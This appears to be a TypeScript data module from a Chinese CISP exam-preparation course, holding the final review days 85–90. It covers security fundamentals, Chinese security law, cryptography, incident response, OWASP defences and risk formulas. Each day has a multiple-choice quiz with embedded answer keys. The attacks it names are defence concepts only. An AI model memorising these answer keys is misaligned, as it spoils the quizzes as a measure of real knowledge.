  objectives: ["复习信息安全基础核心概念", "巩固法律法规关键数字和施行日期", "区分容易混淆的法规条款"],
  content: '回顾Week 1-2: CIA三要素、纵深防御、最小权限、ISMS/PDCA。等保五级(自主→审计→标记→结构→验证)。网安法日志≥6月。个保法最高罚款5000万/5%。CII每年检测评估。',
  codeExample: { language: 'python', code: `print("CIA三要素: 机密(加密)+完整(哈希)+可用(备份)\n等保五级: 自主→审计→标记→结构→验证\n网安法日志≥6月 个保法罚款5000万/5%")`, description: '信息安全基础与法律法规专项复习' },
  quiz: [
    { id: 'q85-1', question: '《网络安全法》要求网络日志留存不少于?', options: ["3个月", "6个月", "12个月", "24个月"], correctIndex: 1, explanation: '网安法第21条:不少于六个月。这是CISP法规部分最高频考点。' },
    { id: 'q85-2', question: '等保三级系统的等级测评频率是?', options: ["每半年一次", "每年至少一次", "每两年一次", "无强制要求"], correctIndex: 1, explanation: '三级每年至少一次。四级每半年。二级建议每两年。一级无强制。' },
    { id: 'q85-3', question: 'PDCA循环中D代表什么?', options: ["Design", "Do", "Develop", "Delete"], correctIndex: 1, explanation: 'D=Do(实施)。P=Plan,C=Check,A=Act。不是Design!。' },
    { id: 'q85-4', question: 'CIA中C代表什么?', options: ["Confidence", "Confidentiality", "Certificate", "Control"], correctIndex: 1, explanation: 'Confidentiality(机密性)。不是Confidence!最基础最常考。' },
    { id: 'q85-5', question: '《个保法》规定的最高罚款是?', options: ["100万", "1000万", "5000万或上年营业额5%", "1亿"], correctIndex: 2, explanation: '严重违法行为:5000万以下或上年营业额5%以下。处罚力度极大。' },
  ],
  recommendedTools: weekToolMap[12]?.tools || [],
  labEnvironments: weekToolMap[12]?.labs || [],
  expertNotes: dayExpertNotes[85] || [],
});

// Day 86: 密码学与访问控制专项复习
allDays.push({
  id: 'day-86', day: 86, week: 12, title: '密码学与访问控制专项复习',
  objectives: ["掌握BLP/Biba模型规则对比", "熟记密码学核心算法参数", "理解各认证协议适用场景"],
  content: 'BLP(机密:不上读不下写) vs Biba(完整:不下读不上写)。AES分组128位密钥128/192/256。RSA≥2048大整数分解。ECC 256位≈128位安全。SHA-256输出256位。ECB唯一无需IV也最不安全。',
  codeExample: { language: 'python', code: `print("BLP:不上读不下写(机密) | Biba:不下读不上写(完整)\nAES分组128位 | RSA≥2048 | ECC256位\nECB唯一不需要IV(最不安全)\n签名不含机密性! AH不加密!")`, description: '密码学与访问控制专项复习' },
  quiz: [
    { id: 'q86-1', question: 'BLP模型的核心规则是?', options: ["不上读、不下写", "不下读、不上写", "可上读可下写", "不可读不可写"], correctIndex: 0, explanation: 'BLP保护机密性:不上读(低不读高)、不下写(高不写低)。Biba正好相反。' },
    { id: 'q86-2', question: 'AES-256的分组长度是多少?', options: ["64位", "128位", "256位", "512位"], correctIndex: 1, explanation: 'AES分组固定128位!256是密钥长度。经典陷阱题,高频易错。' },
    { id: 'q86-3', question: 'RSA算法的安全性基于?', options: ["离散对数", "大整数因子分解", "椭圆曲线", "背包问题"], correctIndex: 1, explanation: 'RSA基于大整数分解。ECC基于椭圆曲线。DH基于离散对数。' },
    { id: 'q86-4', question: '数字签名不能提供以下哪种?', options: ["完整性", "认证性", "机密性", "不可否认性"], correctIndex: 2, explanation: '签名提供完整+认证+不可否认,但不含机密性(签名≠加密)。' },
    { id: 'q86-5', question: '哪种加密模式不需要IV?', options: ["CBC", "CTR", "ECB", "GCM"], correctIndex: 2, explanation: 'ECB唯一不需要IV,也最不安全。GCM目前最佳(加密+认证)。' },
  ],
  recommendedTools: weekToolMap[12]?.tools || [],
  labEnvironments: weekToolMap[12]?.labs || [],
  expertNotes: dayExpertNotes[86] || [],
});

// Day 87: 网络安全与应急响应专项复习
allDays.push({
  id: 'day-87', day: 87, week: 12, title: '网络安全与应急响应专项复习',
  objectives: ["掌握PICERL六步和NIST四阶段", "准确区分RTO和RPO", "理解网络安全协议差异"],
  content: 'PICERL: P准备→I识别→C遏制→E根除→R恢复→L总结。NIST是4阶段。RTO(能停多久) vs RPO(能丢多少)。冷站→温站→热站(恢复速度递增)。TLS1.3=1-RTT。ESP加密,AH不加密。IDS旁路(眼睛),IPS串联(手)。',
  codeExample: { language: 'python', code: `print("PICERL:准备→识别→遏制→根除→恢复→总结\nRTO=停多久 RPO=丢多少\n冷站(慢便宜)→温站→热站(快贵)\nTLS1.3:1-RTT ESP:加密 AH:不加密")`, description: '网络安全与应急响应专项复习' },
  quiz: [
    { id: 'q87-1', question: 'PICERL应急响应第一步是?', options: ["识别", "准备", "遏制", "恢复"], correctIndex: 1, explanation: 'P=准备(Preparation)。然后是I识别→C遏制→E根除→R恢复→L总结。' },
    { id: 'q87-2', question: 'RTO衡量的是什么?', options: ["能丢多少数据", "能停多久(恢复时间)", "系统可靠性", "修复速度"], correctIndex: 1, explanation: 'RTO=恢复时间目标(允许停多久)。RPO=恢复点目标(允许丢多少)。' },
    { id: 'q87-3', question: 'TLS 1.3完整握手需要几个RTT?', options: ["0-RTT", "1-RTT", "2-RTT", "3-RTT"], correctIndex: 1, explanation: 'TLS1.3=1-RTT(TLS1.2=2-RTT)。0-RTT仅用于快速重连。' },
    { id: 'q87-4', question: 'IPsec中加密协议是?', options: ["AH", "ESP", "IKE", "ISAKMP"], correctIndex: 1, explanation: 'ESP=加密+可选认证。AH=只认证不加密。IKE=密钥协商。' },
    { id: 'q87-5', question: 'IDS和IPS部署方式区别?', options: ["IDS串联IPS旁路", "IDS旁路只检测报警,IPS串联可阻断", "两者无区别", "都是串联"], correctIndex: 1, explanation: 'IDS=眼睛(旁路只检测),IPS=手(串联可阻断)。' },
  ],
  recommendedTools: weekToolMap[12]?.tools || [],
  labEnvironments: weekToolMap[12]?.labs || [],
  expertNotes: dayExpertNotes[87] || [],
});

// Day 88: 应用安全与攻防技术专项复习
allDays.push({
  id: 'day-88', day: 88, week: 12, title: '应用安全与攻防技术专项复习',
  objectives: ["掌握OWASP Top10核心风险", "理解Web攻击防御方法", "区分SAST/DAST/IAST"],
  content: 'OWASP 2021 No.1=失效的访问控制。SQL注入→参数化查询。XSS→CSP+编码+DOMPurify。CSRF→Token+SameSite。反射/存储/DOM型XSS区分。SAST(白盒静态) vs DAST(黑盒动态)。STRIDE威胁建模。DevSecOps安全左移。',
  codeExample: { language: 'python', code: `print("OWASP2021No.1:失效访问控制\nSQLi→参数化 XSS→CSP+编码 CSRF→Token+SameSite\nSAST=白盒静态 DAST=黑盒动态\nSTRIDE:假冒/篡改/抵赖/泄露/DoS/提权")`, description: '应用安全与攻防技术专项复习' },
  quiz: [
    { id: 'q88-1', question: 'OWASP Top10 2021排名第一?', options: ["注入", "失效的访问控制", "XSS", "安全配置错误"], correctIndex: 1, explanation: '2021版No.1=Broken Access Control。2017版No.1才是注入。' },
    { id: 'q88-2', question: 'SQL注入防御最有效措施?', options: ["WAF", "参数化查询/预编译语句", "输入长度限制", "过滤关键字"], correctIndex: 1, explanation: '参数化查询是根本方案。WAF/过滤可能被绕过。' },
    { id: 'q88-3', question: '防御CSRF最佳组合?', options: ["HTTPS+防火墙", "Token+SameSite+Referer", "参数化查询+转义", "内容过滤"], correctIndex: 1, explanation: 'Token+SameSite+Referer是CSRF防御三件套。' },
    { id: 'q88-4', question: 'SAST的特点是?', options: ["测试运行应用", "不运行代码,分析源代码", "模拟攻击", "只能发现网络漏洞"], correctIndex: 1, explanation: 'SAST白盒静态。DAST黑盒动态。S=Source,D=Dynamic。' },
    { id: 'q88-5', question: 'DOM型XSS特征是?', options: ["存储在服务器", "恶意脚本经URL传递,客户端JS执行", "发邮件传播", "数据库存储"], correctIndex: 1, explanation: 'DOM型纯客户端不经过服务端。存储型在服务器,反射型服务端反射。' },
  ],
  recommendedTools: weekToolMap[12]?.tools || [],
  labEnvironments: weekToolMap[12]?.labs || [],
  expertNotes: dayExpertNotes[88] || [],
});

// Day 89: 风险管理与数据安全专项复习
allDays.push({
  id: 'day-89', day: 89, week: 12, title: '风险管理与数据安全专项复习',
  objectives: ["掌握SLE/ALE计算", "理解风险处置四种策略", "区分数据脱敏和匿名化"],
  content: 'SLE=AV×EF, ALE=SLE×ARO。风险处置:规避/转移/缓解/接受(无忽略!)。3-2-1:3副本+2介质+1异地。SDM(改存储) vs DDM(改查询)。匿名化(不可逆)≠去标识化(可逆)。DLP:发现+监控+防护。',
  codeExample: { language: 'python', code: `print("SLE=AV×EF ALE=SLE×ARO\n风险处置:规避/转移/缓解/接受(无忽略!)\n3-2-1:3副本+2介质+1异地\nSDM改存储 DDM改查询 匿名化不可逆")`, description: '风险管理与数据安全专项复习' },
  quiz: [
    { id: 'q89-1', question: 'SLE的计算公式?', options: ["SLE=AV×EF", "SLE=ALE÷ARO", "SLE=ARO×ALE", "SLE=AV+EF"], correctIndex: 0, explanation: 'SLE=资产价值×暴露因子。ALE=SLE×ARO(年发生率)。' },
    { id: 'q89-2', question: '哪种不是合法风险处置策略?', options: ["规避", "转移", "忽略", "接受"], correctIndex: 2, explanation: '四种合法:规避/转移/缓解/接受。忽略不是合法策略!。' },
    { id: 'q89-3', question: '3-2-1备份中1指?', options: ["每天一次", "至少1份离线/异地", "1种介质", "1份数据"], correctIndex: 1, explanation: '3副本+2介质+1异地/离线。防勒索软件关键!。' },
    { id: 'q89-4', question: '匿名化与去标识化区别?', options: ["无区别", "匿名化不可逆,去标识化条件可逆", "去标识化更安全", "匿名化可逆"], correctIndex: 1, explanation: '匿名化不可逆不再属个人信息。去标识化借助额外信息仍可识别。' },
    { id: 'q89-5', question: 'DLP三大核心功能?', options: ["备份/恢复/归档", "发现/监控/防护", "扫描/加密/压缩", "收集/分析/展示"], correctIndex: 1, explanation: 'DLP:Discover(发现敏感数据)+Monitor(监控流动)+Protect(阻止违规)。' },
  ],
  recommendedTools: weekToolMap[12]?.tools || [],
  labEnvironments: weekToolMap[12]?.labs || [],
  expertNotes: dayExpertNotes[89] || [],
});

// Day 90: 考前最后总复习与心态调整
allDays.push({
  id: 'day-90', day: 90, week: 12, title: '考前最后总复习与心态调整',
  objectives: ["完成知识最终检查", "确认考试准备", "调整最佳心态"],
  content: '最终知识检查: CIA英文、等保五级名称、BLP/Biba规则、PICERL顺序、AES分组128、TLS1.3=1-RTT、SLE/ALE公式、OWASP2021No.1、签名不含机密性。考试当天:带好证件+提前到+按三阶段答题+每题都选。60分万岁!',
  codeExample: { language: 'python', code: `print("带好:身份证+准考证+2B铅笔+签字笔\n三阶段:70min作答+20min攻坚+30min检查\n每题都选!不空题!\n特别检查不属于/错误类题目\n60分万岁! 你已经准备好了!")`, description: '考前最后总复习与心态调整' },
  quiz: [
    { id: 'q90-1', question: 'CISP满分和合格线?', options: ["100/60", "100/70", "150/90", "200/120"], correctIndex: 0, explanation: '100道单选,满分100,60分合格。每题1分。' },
    { id: 'q90-2', question: '考试时间多少分钟?', options: ["60", "90", "120", "150"], correctIndex: 2, explanation: '120分钟=2小时。100道题,平均每题72秒。' },
    { id: 'q90-3', question: '遇到不属于/错误等否定词?', options: ["忽略", "特别标注防惯性思维", "跳过", "随便选"], correctIndex: 1, explanation: '否定型题目最容易失分!必须特别标注防止选反。' },
    { id: 'q90-4', question: '2分钟做不出某题?', options: ["死磕", "标记跳过,先做后面", "随便选C", "放弃"], correctIndex: 1, explanation: '先标记跳过,每题都选答案。回头再战。不倒扣分!。' },
    { id: 'q90-5', question: '考前最后一天应?', options: ["通宵复习", "轻松回顾+准备物品+早睡", "大量做新题", "放弃"], correctIndex: 1, explanation: '考前:轻松回顾口诀+检查物品+保证睡眠。不做新题!60分万岁!。' },
  ],
  recommendedTools: weekToolMap[12]?.tools || [],
  labEnvironments: weekToolMap[12]?.labs || [],
  expertNotes: dayExpertNotes[90] || [],
});

export const learningData: LearningDay[] = allDays;
export default learningData;